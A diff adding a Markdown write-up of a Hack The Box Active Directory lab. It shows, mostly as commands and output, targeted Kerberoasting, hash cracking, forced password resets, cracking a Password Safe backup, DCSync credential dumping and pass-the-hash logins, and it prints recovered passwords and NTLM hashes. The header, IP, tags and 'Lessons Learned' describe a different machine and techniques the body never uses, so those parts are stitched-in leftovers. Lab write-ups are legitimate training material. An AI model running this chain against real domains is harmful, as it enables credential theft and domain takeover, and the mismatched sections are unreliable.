@@ -1,0 +1,404 @@
+# 🧑‍💻 Hack The Box – Support
+
+## 📌 Overview
+- **Machine Name:** Support
+- **IP Address(es):** 10.10.11.174
+- **Difficulty:** Medium
+- **OS:** Windows
+- **Tags:** SMB / Active Directory / LDAP / Reverse Engineering / RBCD
+- **Date Completed:** 2025.08.29
+- **Status:** ✅ User |  Root
+
+---
+##  Machine Information
+
+As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich
+
+## 🖥️ Initial Recon
+### Nmap
+```zsh
+nmap -sC -sV -oA nmap/administrator 10.10.11.42
+```
+
+```
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-30 15:13:22Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+51028/tcp open  msrpc         Microsoft Windows RPC
+62775/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+62780/tcp open  msrpc         Microsoft Windows RPC
+62794/tcp open  msrpc         Microsoft Windows RPC
+62802/tcp open  msrpc         Microsoft Windows RPC
+62838/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+**Findings:**
+* 21/tcp → FTP
+* 139/tcp → SMB (guest access enabled)
+
+
+### FTP Enumeration
+
+```zsh
+ftp 'ftp://Olivia:ichliebedich.@10.10.11.42'
+Connected to 10.10.11.42.
+220 Microsoft FTP Service
+331 Password required
+530 User cannot log in.
+ftp: Login failed
+ftp: Can't connect or login to host `10.10.11.42:ftp'
+221 Goodbye.
+```
+*Could not get acces to ftp.
+
+### SMB Enumeration
+
+```bash
+nxc smb administrator.htb -u 'Olivia' -p 'ichliebedich' --shares
+```
+
+```
+SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server sh
+```
+
+*Did not discover anything intresting on SMB shares.
+
+---
+
+## 🧭 BloodHound
+
+Collected domain data:
+
+```zsh
+rusthound-ce -d administrator.htb -u 'Olivia' -p 'ichliebedich' -o bloodhound --ldap-filter='(objectGuid=*)' -c All
+```
+![alt text](ScreenShots/olivia_to_michael.png)
+
+* Found intresting thing, Olivia has GenericAll on a user named michael
+
+---
+
+
+---
+ 
+### 🔑 Exploitation
+
+The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.
+
+```zsh
+bloodyAD  -d "administrator.htb" --host "DC.administrator.htb" -u 'Olivia' -p 'ichliebedich' set object 'michael' servicePrincipalName -v 'http/anything'
+
+[+] michael's servicePrincipalName has been updated
+```
+
+```
+nxc ldap 'DC.administrator.htb' -d 'administrator.htb' -u 'Olivia' -p 'ichliebedich' --kerberoasting michael
+KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+Tried to run Kerberoasting but got Clock skew error, we need to syncronize our clock to the remote host.
+
+```zsh
+sudo ntpdate DC.administrator.htb
+```
+After syncing our time we got our kerberoast ticket for user michael
+
+```
+$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$bdb8a9b6c00cac267f88081e1aaf1c9e$52376bddc7214953e3f6226222f47baee72051eb71e7a3d16bea807ff736a07f5417871e351f7faa1716066eb9aed3b802c3ed7a9cddc8062444b5b634be473e6041984aa5c13555fd9c6423b0cc0aa8007eb76a7b13117763a7b1e209b9684a5399bc554d0faa2a38475c156ca53dd5940ae8e98491b0c673b6ff84c0cc3169ae78e72cbcb4e25808217eefb3310674bad80011babd7627cce0d2115e9f4be420351a852f0741f53bed36deb956439c1564db6b20c388429c1527166e0566aa3878f5c838c07c06da1490fa6387de4064c0b0910cf1f09f9d0cb5338545ad320b180908f03870340d850454a70761fb07f2f673c60288becae4f2b3b8fa01dfc8d341b84142edac9f0836b8aac9ace1911b2231db10771e60a40145aa5da90e2bbe79b777ddf5c8b62f37e49ba17a01766628ae5ef6ff078958b65d32893984efee6b5d7fa1e62822cae103af8f80c51bcaf8751d3819bba0381504d2e071b93d25a892f132430b00e127757759b73c8bf9397724234d46dcd9b28874f0cd1f88e088e3b3f7d4790f8d3a0ab195dc0b0c046c61d4c33c2a69174c7337f5720f3844515ba9bb4b083ef96e2d5f255912f8b9abb0da8b8f94f2bd4100b6db6fbc747f8bdd78d810c0d3dd04184acab2b15b7784a49c17a01af0ea21fd0499655b35880be2f24f310cef284b44ef376923e2a9885ed2af40c9694db9122c22f86eabe282169d62365982a80315f4da30760beff243c5cc6132e3c03793b611c9991c557f3d4559910f3aa101d5e360ffbe344a9b2735c890276f4cfad6448ad78b29860aef83ce266508d12a27de0a371f88ce3f42b357e29e0ea1249817571d920bc6ee4aad1941153edee2cb531faad75ee1f0a18e65c7c16988887d495e7ce4ae14f5d5451efe66ec10a5396049b2f8edba61d7aa70fcbbe9cd26723a444aa52c8f089466c17527f17a0ef606dee4e9a785670a2de4bd82da0020c3c9a11ed4907b61281beacdf06c65dd6a76d8343cba08262bae5295b0d2ea34b9d3f132c06c1bc9fe51685fc49fd5921ef92987b776113f70d674838892d9d6cc3ea29c1e34a9fb9b8e00f4c3aa3ec88713c5ac80ef59f6ffd65e15e24396a6e9376b4b7db6f11e41f4d6f0f04f033e5ec3d0c032b84beafe4f12cecc347b1c6741e8d87fe566359c221d71a75d74a7b79b8e71d4f3ef8c1a5b8ddaa76067215951e5fca62592006f1df1cfd0be4dbc85462d6c6bc5a46e2cc064e6e332efe0343511797c15bd2dec542f02cb575a64312c6d1755aa4e33cfae38565aa37a35e0d0b7830004cd6993d9fd72bfac36babaf678d748fc7f3b753e8a1e8bd5e7cb03e101593d065fa81b57c8c02c4fdb574aedd0c1c750cebb66afb59084aba315f5b13827fb65c41428a5d66908589139f554f627be3ceaacf79a4b9a5e36443cf19f35a426de0adc1bca857d69c250dc2bcb61c057482c384a2f0ec14b50ee539a93e86e211a8c38ebdf7c76f548b5c08b711d974ec0ab5d2e220534cf
+```
+Now we can trie and crack it using hashcat
+
+```zsh
+hashcat michaelkrb.hash --wordlist /usr/share/wordlists/rockyou.txt
+```
+And after hashcet finishes we get the following password for user michael
+
+```zsh
+kali123
+```
+```
+---
+
+---
+
+## 🧭 BloodHound
+
+* michael user has ForceChangePassword on user benjamin
+
+![alt text](ScreenShots/michael_to_benjamin.png)
+
+### 🔑 Exploitation
+
+Useing BloodyAD's wecan change the user's password.
+
+```zsh
+bloodyAD -d 'administrator.htb' -u 'michael' -p 'kali123' --host 'DC.administrator.htb' set password benjamin Test1234.
+
+[+] Password changed successfully!
+```
+benjamin is a member of the Share Moderators Group, so im assuming he has acces to the FTP share we discoverd on the beginning.
+
+![alt text](ScreenShots/benjamin_membe_of_group.png)
+
+---
+
+---
+
+## FTP
+After successfully loggin into  the ftp server, i discovered a file named backup which seems to encrypted with passwordsafe
+
+```zsh
+ftp 'ftp://benjamin:Test1234.@10.10.11.42'
+ftp> get Backup.psafe3
+```
+
+After doing a little bit of research i found out john can trasnfomm te file into a hash and crack it so i did.
+
+```zsh
+pwsafe2john Backup.psafe3 > pwsafe.hash
+```
+
+```zash
+john pwsafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+After john finished i got the passwrod 
+
+```zsh
+tekieromucho 
+```
+After installing passwordsafe and checking the datasbse i found 3 users with passwords
+
+```zsh
+username: alexander Password: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+username: emily     Password: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+username: emma      Password: WwANQWnmJnGV07WQN8bMS7FMAbjNur
+```
+
+After running a quick check i found a valid credential for the user emily
+
+```zshnxc smb administrator.htb smb -u usernames.txt  -p passwords.txt  --continue-on-success
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
+SMB         10.10.11.42     445    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
+SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
+SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE
+SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE
+SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
+SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
+```
+---
+
+
+###  ???
+---
+
+```zsh
+evil-winrm -i administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+
+type user.txt
+629866b1f254acd3a8cb232669a022f2
+```
+* After gaining shell acces to the user emily i ran winPEAS but could not find anything.
+
+---
+
+---
+
+## 🧭 BloodHound
+
+* After looking at bloodhound graph i discovered that eemily has GenericWrite on another user called ethan
+
+![alt text](ScreenShots/emily_to_ethan.png)
+
+---
+
+---
+
+## Exploiting
+
+The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.
+
+```zsh
+bloodyAD -d 'administrator.htb' --host 'DC.administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object 'ethan' servicePrincipalName -v 'http/whatevr'
+
+[+] ethan's servicePrincipalName has been updated
+
+```
+ nxc ldap 'DC.administrator.htb' -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoasting 'ethan' 
+
+ $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e702613314cc071c95cf9337bd31768d$7c9073aba196a9e6c640c4cf7b90d77eeea3abb4bcd2804ef153453ebf393ace1677255f312ebf40172340f1f6c9ed609e4edf6a232022ee9460d80dc95dc13bee8e4fc3df1f86153ff64530906885237fb7cb455c31a4746d2d8bd800d94d67120a5003a7fa3ab3d820aac2df7505aa5dc28d5032d7216baee68dc636cad1325ff3c2b34f5845d3c498bf6f94128e83180c0dd388d64e6e002d310af884fd352c439a039f2bf7604e24e1b28729e46120af75416e043512118899dd9f54701cffeb7c5fbfec4d0dcfe5aaf781309d07a591e6193ee71483e93e6e3af4dc58841c3159832ed458e22a21db1d3e71ad7278e8f24ac5bc2707bad5e9cca2d9b5bcb0471089642feb9a5e27a3c52f92b9db36ee4dc7f812feedce1a308fe84f33d84d22b2c52855981623cdd3baa79b3d9aefe1c3dd3f37e427a94da1e539ddbb4f4465cbd7ee0650d8602cf66b5b19b629776fc1bb883d3b7c7b4094124c2a61d2f57988f3e0665d7f07a22ac1b4e8e72326793a839fa12183aa151b537c81744e3c91106ef97f64b61fa6fc2300002827a6142a2500332aee15e5e6e46ab786426b96fdccd31df7922346c7000c2155695bf8ef887959d76a26ead72b318b48953cc87399c90e9eb47b728538ef5821540d8b1ea206b4ed4a083c35297b7019e370e2b9cbcf92c807b422c3c8fb324e76b9b1f82cefa0fd7972c90bce20deff6298eb585eea8aea4ef5d09d07189db9490d1356ba65ff650a0bf593bb8231eb7dee0d51e399982cc147dbe4770e41054edd7d9a977cc69161c231c74319cd6d6031fe36a7a10ee7cc6f56d5b5fb5944ae496845dc0f80200266c7d53ae9f0f8c0e759abaedc8fd994bf97bbdf5a1cc841b7af7943e7995011b6b02e39d27526982e6d46f7a29d4989393fc9b4bbc795ea5b3361aa90816bb431c5a2fcc8c00ff738ca3475d4eaabae505367fe4b4bbb119fd43ea69ba079d46e08a22d2b9bfdcc86f040684ffbb8490328d623e4d132e843e057ba1453c1aa8c06396191dd7c548f9d240fd5762db991959e8d5c3ee509fa0da2eea5b6e2331be1734c18bf7ecd2f1c0e5f37f578a632cd8e08dbacf8b940b8cab60e81df2cde65e9c9800df5704c2c07fc91f465826ec4c160076778cfbe768632f7d3053f0b0f027847ef495f8b5aab0c4275bfecd4a41501ebc8b861c43a0c690ce85d7e9e1412787ecd72d5c7f7a71f2703e5c7251701d8e60e2d334357c9d1ed0892828cb6e5252bef9f21d564a936ee366a52b9e682d860345e55a208268c440c6c7358d766f0af9cbfd004dd8c0ac6f677611a70b87a332f4ef7ac49ea4ecc9cb0c2806807984af40521a0388cbc786f94c2d312086734f87ed5ebe2687b47ffa17019ea84bf24a5db3820336865d88ee01f2e5e56b13a9248f6f55353e56952ce33357bee26c721d38b6375c6c38604846ed28d0d7417f3374592b6fb3ef35839473a414abad3941ce03db003a8807c9f12df6c92039e08607b5e0bf19c802b3ba3576f161f365477
+
+
+```zsh
+hashcat ethankrb.hash --wordlist /usr/share/wordlists/rockyou.txt
+```
+And after hashcet finishes we get the following password for user ethan
+
+```zsh
+limpbizkit limpbizkit
+```
+
+---
+
+
+
+###  ???
+
+---
+
+## ???
+
+we do not have acces to a shell win winrm, and could not find anything a way forward, but after a while i realized my bloodhound did not ingest 1 file and i got an error, so i ran bloodhound-ce-python collector since i know it reliable and trusted with our new user.
+
+```zsh
+bloodhound-ce-python -ns 10.10.11.42 -d administrator.htb -u 'ethan' -p 'limpbizkit' -c all --zipb
+```
+
+![alt text](ScreenShots/ethan_domain.png)
+
+* Low and behold we found our missing piece, we have different permissions on  the domain.
+
+---
+
+
+## exploit
+
+---
+i performed a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py
+
+```zsh
+impacket-secretsdump 'administrator.htb/ethan:limpbizkit@DC.administrator.htb'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
+administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
+administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
+administrator.htb\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959
+administrator.htb\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b
+administrator.htb\michael:des-cbc-md5:43c2bc231598012a
+administrator.htb\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f
+administrator.htb\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e
+administrator.htb\benjamin:des-cbc-md5:b6f84a864376a4ad
+administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
+administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
+administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
+administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
+administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
+administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
+administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
+administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
+administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
+administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
+administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
+administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up...
+```
+* I got the administrator hash now we can login as administrator
+
+
+```zsh
+evil-winrm -i administrator.htb -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e
+```
+
+```zsh
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+a1685e5c6f5672a76b1395476440dc43
+
+```
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 🏁 Flags
+
+* **User.txt:** `629866b1f254acd3a8cb232669a022f2`
+* **Root.txt:** ``
+
+
+---
+
+## 🧠 Lessons Learned
+
+* **Technical:**
+
+  * Reverse engineering revealed hardcoded service account credentials.
+  * LDAP info fields may leak sensitive data (poor OPSEC).
+  * RBCD remains a powerful AD privilege escalation vector.
+
+* **Personal:**
+
+  * Always test leaked creds against multiple accounts.
+  * Automating LDAP parsing speeds up discovery of hidden values.
+
+* **Reusable Techniques:**
+
+  * Decode obfuscation (base64 + XOR).
+  * Use BloodHound to identify misconfigurations.
+  * Exploit RBCD for Domain Admin when `GenericAll` on DC computer object.
+
+---
